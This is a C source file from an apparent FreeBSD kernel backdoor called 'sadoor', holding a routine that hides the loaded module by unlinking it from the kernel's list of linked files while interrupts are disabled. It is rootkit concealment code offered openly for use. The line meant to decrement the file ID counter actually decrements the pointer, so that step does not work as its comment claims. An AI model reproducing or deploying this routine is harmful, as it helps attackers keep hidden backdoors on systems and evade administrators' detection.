/*
 *  File: hide_module.c
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: Module hiding routines
 *  Version: 1.0
 *  Date: Thu Jul  3 15:48:22 CEST 2003
 *
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met: 
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *      
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. 
 */     

#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/linker.h>
#include "sadoor.h"

#ifdef SAKMOD_HIDE_MODULE

/* Module filename */
#define SAKMOD_MODULE_FILENAME    "sadoor.ko"

/*
 * Hide the module by removing it from the list 
 * of linked files and decrease the file ID counter.
 *
 * We use addresses, but if you want to do it in some other way
 * you have to make sure that sadoor.ko is not the last module, 
 * and set the tqh_last and tqe_prev pointers "correct".
 */
void
hide_module(void)
{
    int s;
    int addr[] = SAKMOD_HIDE_MODULE;
    
    int *next_file_id_pt = (int *)(addr[0]);
    linker_file_list_t *linker_files_pt = (linker_file_list_t *)(addr[1]);

    linker_file_t linkf = 0;

    /* Find the file by name */
    if ( (linkf = linker_find_file_by_name(SAKMOD_MODULE_FILENAME)) == NULL) {
        uprintf("Warning: hide_module(): Could not find file \"%s\"\n", 
            SAKMOD_MODULE_FILENAME);
        return;
    }

    /* Disable interrupt */
    s = splhigh();

    /* Decrease the file ID counter */
    *next_file_id_pt--;

    /* Remove the file from the linked files */
    TAILQ_REMOVE(linker_files_pt, linkf, link);

    /* Restore interrupt */
    splx(s);

}

#endif /* SAKMOD_HIDE_MODULE */

